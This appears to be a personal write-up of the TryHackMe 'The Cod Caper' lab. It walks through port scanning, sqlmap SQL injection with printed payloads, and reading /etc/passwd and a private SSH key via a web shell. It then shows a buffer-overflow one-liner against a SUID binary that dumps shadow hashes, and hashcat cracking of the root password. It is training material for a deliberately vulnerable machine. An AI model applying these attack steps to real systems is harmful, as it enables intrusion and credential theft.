---
title: TryHackMe The Cod Caper
description: TryHackMe The Cod Caper challenge
date: 2021-09-21
tags: [TryHackMe, pentesting]
draft: true
---
This is my attempt at TryHackMe's [The Cod Caper](https://tryhackme.com/room/thecodcaper) challenge.
# Host Enumeration
```
$ sudo nmap -sS -sC -sV -vv 10.10.201.223
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## How many ports are open on the target machine?
**Answer**: `2`
## What is the http-title of the web server?
**Answer**: `Apache2 Ubuntu Default Page: It works`
## What version is the ssh service?
**Answer**: `OpenSSH 7.2p2 Ubuntu 4ubuntu2.8`
## What is the version of the web server?
**Answer**: `Apache/2.4.18`
# Web Enumeration
```
$ gobuster dir -u http://10.10.201.223 -w $(pwd)/big.txt -x php,txt
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/administrator.php    (Status: 200) [Size: 409]
```
## What is the name of the important file on the server?
**Answer**: `administrator.php`
# Web Exploitation
```
$ sqlmap -u http://10.10.201.223/administrator.php --forms --dump
do you want to test this form? [Y/n/q] 
> y
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] y
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:
---
Parameter: username (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: username=gAUA' AND EXTRACTVALUE(3275,CONCAT(0x5c,0x716a627171,(SELECT (ELT(3275=3275,1))),0x717a6b6b71)) AND 'MhoV'='MhoV&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=gAUA' AND (SELECT 9025 FROM (SELECT(SLEEP(5)))QlaT) AND 'qfQg'='qfQg&password=
---
[19:13:44] [INFO] fetching current database
[19:13:45] [INFO] retrieved: 'users'
[19:13:45] [INFO] fetching tables for database: 'users'
[19:13:46] [INFO] retrieved: 'users'
[19:13:46] [INFO] fetching columns for table 'users' in database 'users'
[19:13:47] [INFO] retrieved: 'username'
[19:13:47] [INFO] retrieved: 'varchar(100)'
[19:13:48] [INFO] retrieved: 'password'
[19:13:48] [INFO] retrieved: 'varchar(100)'
[19:13:48] [INFO] fetching entries for table 'users' in database 'users'
[19:13:49] [INFO] retrieved: 'secretpass'
[19:13:49] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+
```
## What is the admin username?
**Answer**: `pingudad`
## What is the admin password?
**Answer**: `secretpass`
## How many files are in the current directory?
**Answer**: `3`
# Command Execution
## How many files are in the current directory?
* From the web interface:
```bash
$ ls -la
total 28
drwxr-xr-x 2 root root 4096 Jan 16 2020 .
drwxr-xr-x 3 root root 4096 Jan 15 2020 ..
-rw-rw-r-- 1 root root 378 Jan 15 2020 2591c98b70119fe624898b1e424b5e91.php
-rw-r--r-- 1 root root 1282 Jan 15 2020 administrator.php
-rw-r--r-- 1 root root 10918 Jan 15 2020 index.html
-rw-r--r-- 1 root root 10918 Jan 15 2020 index.html
```
* In my instance, the only acceptable answer was 3.

**Answer**: `3`
## Do I still have an account
* From the web interface:
```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false papa:x:1000:1000:qaa:/home/papa:/bin/bash mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin pingu:x:1002:1002::/home/pingu:/bin/bash pingu:x:1002:1002::/home/pingu:/bin/bash
```

**Answer**: `Yes`
## What is my SSH password?
1. From the web interface:
```bash
$ ls -a /home
papa pingu
$ ls -a /home/pingu
.bash_history .cache .gdb_history .gdbinit .nano .pwntools-cache-2.7 .ssh .ssh
$ cat /home/pingu/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
-----END RSA PRIVATE KEY-----
```
1. From your terminal save `pingu`'s private SSH key into a local file with a new blank line at the end. The server still asks for an SSH password.
```bash
$ chmod 600 id_rsa
```
2. From the web interface:
```bash
$ find / -iname "*hidden*" 2>/dev/null
/usr/share/help-langpack/en_CA/ubuntu-help/net-wireless-hidden.page
/usr/share/help-langpack/en_CA/ubuntu-help/files-hidden.page
/usr/share/help-langpack/en_GB/ubuntu-help/net-wireless-hidden.page
/usr/share/help-langpack/en_GB/ubuntu-help/files-hidden.page
/usr/share/help-langpack/en_AU/ubuntu-help/net-wireless-hidden.page
/usr/share/help-langpack/en_AU/ubuntu-help/files-hidden.page
/var/hidden
$ ls /var/hidden
pass
$ cat /var/hidden/pass
pinguapingu
```

# LinEnum
## What is the interesting path of the interesting SUID file?
```bash
$ ssh -i id_rsa pingu@10.10.51.123
pingu@10.10.51.123 password: pinguapingu
pingu@ubuntu:~$ find / -perm -4000 2>/dev/null
/opt/secret/root
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/ping6
/bin/ntfs-3g
/bin/mount
/bin/fusermount
/bin/umount
```
**Answer**: `/opt/secret/root`
# `pwndbg`
```
pwndbg> r < <(cyclic 50)
Invalid address 0x6161616c
pwndbg> cyclic -l 0x6161616c
44
```

* 44 characters of input is required for a buffer overflow.
# Binary-Exploitaion: Manually
```
pingu@ubuntu:~$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Segmentation fault
```

* `$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.` is `root`'s password hash.
# Finishing The Job
## What is the `root` password?
```bash
$ hashcat -D 2 -m 1800 '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' rockyou.txt
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.o...x00Ck.
Time.Started.....: Tue Sep 21 20:44:47 2021 (6 mins, 0 secs)
Time.Estimated...: Tue Sep 21 20:50:47 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:      667 H/s (5.93ms) @ Accel:2 Loops:32 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 240384/14344384 (1.68%)
Rejected.........: 0/240384 (0.00%)
Restore.Point....: 239616/14344384 (1.67%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#2....: lucinha -> lentilka
```

**Answer**: `love2fish`

# References
* Hammond, J. (2020). TryHackMe! Buffer Overflow & Penetration Testing [YouTube Video]. In YouTube. <https://youtu.be/2ZZPwwXOH08>